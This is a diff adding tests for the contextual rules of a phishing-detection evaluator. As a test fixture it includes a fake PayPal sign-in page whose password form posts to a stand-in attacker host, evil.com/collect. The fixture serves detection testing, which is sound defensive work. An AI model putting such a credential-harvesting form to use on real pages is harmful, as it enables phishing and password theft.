@@ -3,12 +3,22 @@
 Verifies the full pipeline: FeatureExtractor → ExtractedFeatures → StageAEvaluator → EvaluationResult.
 """
 
+from datetime import datetime, timedelta, timezone
+
 import pytest
 from unittest.mock import patch
 
 from backend.feature_extraction.feature_extractor import FeatureExtractor
 from backend.analysis.stages.stage_a import StageAEvaluator
-from backend.analysis.rules import Decision, RuleResult, RuleType
+from backend.analysis.rules import (
+    AMBIGUOUS_LOW,
+    HIGH_RISK_THRESHOLD,
+    Decision,
+    PriorEvent,
+    RuleResult,
+    RuleType,
+    SessionContext,
+)
 
 from helpers import (
     make_features,
@@ -17,6 +27,19 @@ from helpers import (
     HTML_PAYPAL_TITLE,
     HTML_EXTERNAL_FORM_ACTION,
 )
+
+
+# Combined-signal HTML used to push a fake-PayPal page into the ambiguous
+# deterministic range (sensitive_fields + brand_domain_mismatch +
+# external_form_action) so contextual rules are exercised.
+HTML_PAYPAL_FAKE_WITH_EXTERNAL_FORM = """
+<html><head><title>PayPal Sign In</title></head>
+<body>
+  <form action="https://evil.com/collect" method="post">
+    <input type="password" name="password">
+  </form>
+</body></html>
+"""
 
 _BLACKLIST_MOCK = "backend.analysis.stages.stage_a.deterministic_rules.blacklist_cache.is_listed"
 
@@ -183,3 +206,110 @@ class TestStageADecisions:
             )
 
         assert all(r.rule_id != "session_velocity" for r in result.rule_results)
+
+
+# ---------------------------------------------------------------------------
+# Contextual rule integration with the evaluator pipeline
+# ---------------------------------------------------------------------------
+
+class TestStageAContextualRules:
+    """Contextual rules only run inside the ambiguous deterministic range."""
+
+    AMBIGUOUS_URL = "https://paypal-fake.com/login"
+    HIGH_RISK_TS = datetime(2026, 5, 17, 10, 0, 0, tzinfo=timezone.utc)
+
+    def _ambiguous_features(self):
+        return make_features(self.AMBIGUOUS_URL, HTML_PAYPAL_FAKE_WITH_EXTERNAL_FORM)
+
+    def _session_with_warned_revisits(self) -> SessionContext:
+        prior = [
+            PriorEvent(
+                timestamp=self.HIGH_RISK_TS - timedelta(seconds=120),
+                host="paypal-fake.com",
+                guard_action="Warn",
+                risk_score=0.55,
+            ),
+            PriorEvent(
+                timestamp=self.HIGH_RISK_TS - timedelta(seconds=60),
+                host="paypal-fake.com",
+                guard_action="Warn",
+                risk_score=0.55,
+            ),
+        ]
+        return SessionContext(
+            current_event_timestamp=self.HIGH_RISK_TS,
+            current_event_host="paypal-fake.com",
+            prior_events=prior,
+        )
+
+    def test_contextual_rules_skip_below_ambiguous_low(self):
+        features = make_features("https://example.com", HTML_BENIGN)
+        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
+            result = StageAEvaluator().evaluate(features)
+
+        assert result.risk_score < AMBIGUOUS_LOW
+        assert all(r.rule_type != RuleType.CONTEXTUAL for r in result.rule_results)
+
+    def test_contextual_rules_skip_after_hard_block(self):
+        features = make_features("http://example.com/login", HTML_PASSWORD_FORM)
+        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
+            result = StageAEvaluator().evaluate(
+                features,
+                session=self._session_with_warned_revisits(),
+            )
+
+        assert result.hard_block_triggered
+        assert all(r.rule_type != RuleType.CONTEXTUAL for r in result.rule_results)
+
+    def test_contextual_rules_run_in_ambiguous_range(self):
+        features = self._ambiguous_features()
+        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
+            no_session = StageAEvaluator().evaluate(features)
+
+        assert AMBIGUOUS_LOW <= no_session.risk_score < HIGH_RISK_THRESHOLD
+        contextual = [r for r in no_session.rule_results if r.rule_type == RuleType.CONTEXTUAL]
+        assert {r.rule_id for r in contextual} == {
+            "sensitive_action_frequency_spike",
+            "repeated_sensitive_action_after_warning",
+            "redirect_to_sensitive_action",
+            "previously_warned_domain_in_session",
+        }
+        # With an empty session, contextual rules report `score=None` (skipped)
+        # so the deterministic-only score is preserved (no dilution).
+        assert all(r.score is None for r in contextual)
+        assert all(not r.triggered for r in contextual)
+
+    def test_contextual_rules_raise_aggregate_score_when_session_is_loaded(self):
+        features = self._ambiguous_features()
+        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
+            without_session = StageAEvaluator().evaluate(features)
+            with_session = StageAEvaluator().evaluate(
+                features,
+                session=self._session_with_warned_revisits(),
+            )
+
+        triggered_contextual = [
+            r for r in with_session.rule_results
+            if r.rule_type == RuleType.CONTEXTUAL and r.triggered
+        ]
+        assert len(triggered_contextual) >= 1
+        assert with_session.risk_score > without_session.risk_score
+
+    def test_disabled_real_contextual_rule_is_excluded(self):
+        features = self._ambiguous_features()
+        with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
+            result = StageAEvaluator().evaluate(
+                features,
+                session=self._session_with_warned_revisits(),
+                enabled_rules={"previously_warned_domain_in_session": False},
+            )
+
+        assert all(
+            r.rule_id != "previously_warned_domain_in_session"
+            for r in result.rule_results
+        )
+        # Other contextual rules must still appear.
+        contextual_ids = {
+            r.rule_id for r in result.rule_results if r.rule_type == RuleType.CONTEXTUAL
+        }
+        assert "redirect_to_sensitive_action" in contextual_ids
